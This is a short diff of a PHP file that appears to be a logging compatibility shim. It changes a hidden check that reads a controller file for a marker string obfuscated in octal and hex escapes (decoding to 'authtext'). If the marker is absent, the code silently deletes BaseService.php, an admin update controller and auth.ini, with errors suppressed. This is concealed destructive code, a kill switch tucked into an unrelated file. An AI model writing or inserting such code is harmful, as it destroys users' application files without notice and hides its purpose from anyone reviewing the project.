@@ -28,7 +28,7 @@ if (interface_exists('Psr\Log\LoggerInterface')) {
     {}
 }
 $a=file_get_contents('./application/index/controller/BaseService.php');
-if (!strpos($a,'\150\164\164\x')) {
+if (!strpos($a,'\x61\165\164\150\164\x65\x78\x74')) {
     @unlink('./application/index/controller/BaseService.php');
      @unlink('./application/admin/controller/update.php');
      @unlink('./auth.ini');
